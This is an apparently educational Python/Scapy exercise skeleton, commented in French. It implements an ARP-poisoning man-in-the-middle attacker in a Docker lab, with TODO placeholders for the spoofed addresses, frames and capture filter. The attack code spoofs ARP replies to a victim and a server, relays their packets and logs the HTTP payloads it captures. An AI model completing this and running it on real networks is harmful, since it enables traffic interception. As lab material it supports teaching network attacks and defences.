# D'abord je rassemble tous les imports utiles pour piloter Scapy et orchestrer les threads.
import os
import signal
import sys
import threading
import time
from pathlib import Path
from typing import Optional

# Ensuite je prends Scapy, parce que je veux manier directement les trames Ethernet et ARP sans filtre.
from scapy.all import (  # type: ignore[import-not-found]
    ARP,
    Ether,
    IP,
    Raw,
    TCP,
    conf,
    get_if_hwaddr,
    sendp,
    sniff,
    srp,
)

# Je récupère les paramètres envoyés par Docker pour savoir qui est qui sur le réseau.
VICTIM_IP = os.environ.get("VICTIM_IP", "172.28.0.20")
SERVER_IP = os.environ.get("SERVER_IP", "172.28.0.10")
INTERFACE = os.environ.get("ATTACK_INTERFACE", conf.iface)

# Je fixe un rythme par défaut pour l'empoisonnement, tout en laissant la possibilité de l'ajuster.
POISON_INTERVAL = float(os.environ.get("POISON_INTERVAL", "2"))
LOG_PREFIX = "[ATTACKER]"

# Je pose un événement global pour arrêter proprement les threads.
stop_event = threading.Event()


def log(message: str) -> None:
    """Cette fonction centralise l'affichage des traces pour conserver le préfixe commun et forcer le flush immédiat."""
    print(f"{LOG_PREFIX} {message}", flush=True)


def enable_ip_forwarding() -> None:
    """Tente d'activer l'IP forwarding noyau pour déléguer au système le relais des paquets quand c'est permis."""
    try:
        Path("/proc/sys/net/ipv4/ip_forward").write_text("1", encoding="ascii")
        log("enabled IPv4 forwarding")
    except OSError as exc:
        log(f"failed to enable ip_forward ({exc}); continuing with user-space forwarding")


def resolve_mac(target_ip: str, iface: str) -> str:
    """
    ÉTAPE 1 : Résolution de l'adresse MAC d'une cible via ARP.

    Envoie des requêtes ARP who-has pour récupérer l'adresse MAC associée à l'IP ciblée.

    TODO : Compléter la construction du paquet ARP et l'extraction de la réponse.
    """
    log(f"resolving MAC address for {target_ip}")
    # TODO: Créer un paquet Ether(dst="BROADCAST_MAC") / ARP(pdst=TARGET_IP)
    packet = PACKET_ARP  # TODO: à compléter
    answered, _ = srp(packet, timeout=2, retry=3, iface=iface, verbose=0)
    for _, response in answered:
        mac = RESPONSE_MAC  # TODO: extraire la MAC depuis response[Ether].src
        log(f"MAC for {target_ip} is {mac}")
        return mac
    raise RuntimeError(f"Could not resolve MAC address for {target_ip}")


def poison_arp(victim_mac: str, server_mac: str, attacker_mac: str) -> None:
    """
    ÉTAPE 2 : Empoisonnement ARP bidirectionnel.

    Diffuse en boucle deux réponses ARP falsifiées pour que victime et serveur
    nous croient à l'autre bout.

    TODO : Compléter les trames ARP falsifiées avec les bonnes IP sources (psrc).
    """
    log("starting ARP poisoning loop")
    # TODO: Compléter les champs psrc pour usurper les identités
    frame_to_victim = Ether(dst=victim_mac, src=attacker_mac) / ARP(
        op=2, pdst=VICTIM_IP, hwdst=victim_mac, psrc=SPOOFED_IP_FOR_VICTIM, hwsrc=attacker_mac  # TODO: quelle IP usurper ?
    )
    frame_to_server = Ether(dst=server_mac, src=attacker_mac) / ARP(
        op=2, pdst=SERVER_IP, hwdst=server_mac, psrc=SPOOFED_IP_FOR_SERVER, hwsrc=attacker_mac  # TODO: quelle IP usurper ?
    )
    while not stop_event.is_set():
        sendp(frame_to_victim, verbose=0, iface=INTERFACE)
        sendp(frame_to_server, verbose=0, iface=INTERFACE)
        time.sleep(POISON_INTERVAL)
    log("ARP poisoning loop stopped")


def restore_arp(victim_mac: str, server_mac: str) -> None:
    """
    ÉTAPE 3 : Restauration des tables ARP légitimes.

    Réémet des annonces ARP légitimes pour rendre les caches cohérents avant de quitter.

    TODO : Compléter les adresses MAC sources (src et hwsrc) avec les VRAIES MACs.
    """
    # TODO: Compléter avec les vraies MACs
    sendp(
        Ether(dst=victim_mac, src=REAL_SERVER_MAC)  # TODO: quelle MAC source ?
        / ARP(op=2, pdst=VICTIM_IP, hwdst=victim_mac, psrc=SERVER_IP, hwsrc=REAL_SERVER_MAC),  # TODO: quelle MAC ?
        count=5,
        inter=0.2,
        verbose=0,
        iface=INTERFACE,
    )
    sendp(
        Ether(dst=server_mac, src=REAL_VICTIM_MAC)  # TODO: quelle MAC source ?
        / ARP(op=2, pdst=SERVER_IP, hwdst=server_mac, psrc=VICTIM_IP, hwsrc=REAL_VICTIM_MAC),  # TODO: quelle MAC ?
        count=5,
        inter=0.2,
        verbose=0,
        iface=INTERFACE,
    )


def describe_payload(payload: bytes) -> str:
    """Fabrique un aperçu lisible du payload HTTP en gardant seulement la première ligne pour les logs."""
    text = payload.decode("utf-8", errors="replace")
    first_line = text.splitlines()[0] if text else ""
    return first_line[:120]


def forward_packet(packet, victim_mac: str, server_mac: str, attacker_mac: str) -> None:
    """
    ÉTAPE 4 : Interception et transfert des paquets (MITM).

    Filtre les paquets IP MITM, logge les échanges HTTP et réexpédie la charge utile.

    TODO : Compléter la détermination de la direction et de la MAC de destination.
    """
    if IP not in packet or Ether not in packet:
        return
    if packet[Ether].src == attacker_mac:
        return

    direction: Optional[str] = None
    dst_mac: Optional[str] = None
    # TODO: Compléter les conditions pour détecter la direction
    if packet[IP].src == VICTIM_IP and packet[IP].dst == DESTINATION_IP:  # TODO: quelle IP ?
        direction = "victim->server"
        dst_mac = DESTINATION_MAC  # TODO: vers quelle MAC envoyer ?
    elif packet[IP].src == SOURCE_IP and packet[IP].dst == VICTIM_IP:  # TODO: quelle IP ?
        direction = "server->victim"
        dst_mac = DESTINATION_MAC  # TODO: vers quelle MAC envoyer ?

    if not direction or not dst_mac:
        return

    if Raw in packet and packet.haslayer(TCP):
        if direction == "victim->server" and packet[TCP].dport == 80:
            payload_preview = describe_payload(packet[Raw].load)
            log(f"captured HTTP {direction} seq={packet[TCP].seq} data=\"{payload_preview}\"")
        elif direction == "server->victim" and packet[TCP].sport == 80:
            payload_preview = describe_payload(packet[Raw].load)
            log(f"captured HTTP {direction} seq={packet[TCP].seq} data=\"{payload_preview}\"")

    # TODO: Reconstruire la trame avec la bonne MAC de destination
    new_packet = Ether(src=attacker_mac, dst=DST_MAC) / packet[IP]  # TODO: utiliser dst_mac
    sendp(new_packet, iface=INTERFACE, verbose=0)


def sniff_packets(victim_mac: str, server_mac: str, attacker_mac: str) -> None:
    """
    ÉTAPE 5 : Capture des paquets avec Scapy.

    Démarre le sniffer Scapy et redirige chaque paquet vers le handler MITM.

    TODO : Compléter le filtre BPF pour capturer uniquement le trafic victime↔serveur.
    """
    log("starting packet sniffer")

    def handler(pkt):
        forward_packet(pkt, victim_mac, server_mac, attacker_mac)

    # TODO: Compléter le filtre pour capturer les paquets entre VICTIM_IP et SERVER_IP
    sniff(
        iface=INTERFACE,
        prn=handler,
        store=False,
        stop_filter=lambda _: stop_event.is_set(),
        filter=BPF_FILTER,  # TODO: "ip host ... and ip host ..."
    )


def handle_signals(victim_mac: str, server_mac: str) -> None:
    """Arme des handlers SIGINT/SIGTERM pour déclencher l'arrêt propre et la restitution des tables ARP."""
    def _handler(signum, _frame):
        log(f"received signal {signum}, stopping")
        stop_event.set()
        restore_arp(victim_mac, server_mac)
        sys.exit(0)

    signal.signal(signal.SIGINT, _handler)
    signal.signal(signal.SIGTERM, _handler)


def main() -> None:
    """Pilote tout le cycle de vie de l'attaquant : résolution des cibles, empoisonnement ARP, sniffing et nettoyage final."""
    conf.iface = INTERFACE
    conf.verb = 0

    log("attacker container booting")
    log(f"using interface {INTERFACE}")

    enable_ip_forwarding()

    attacker_mac = get_if_hwaddr(INTERFACE)
    log(f"attacker MAC is {attacker_mac}")

    victim_mac = resolve_mac(VICTIM_IP, INTERFACE)
    server_mac = resolve_mac(SERVER_IP, INTERFACE)

    handle_signals(victim_mac, server_mac)

    poison_thread = threading.Thread(
        target=poison_arp, args=(victim_mac, server_mac, attacker_mac), daemon=True
    )
    poison_thread.start()

    try:
        sniff_packets(victim_mac, server_mac, attacker_mac)
    except Exception as exc:  # noqa: BLE001
        log(f"sniffer exception: {exc}")
    finally:
        stop_event.set()
        poison_thread.join(timeout=1)
        restore_arp(victim_mac, server_mac)
        log("exiting cleanly")


if __name__ == "__main__":
    main()
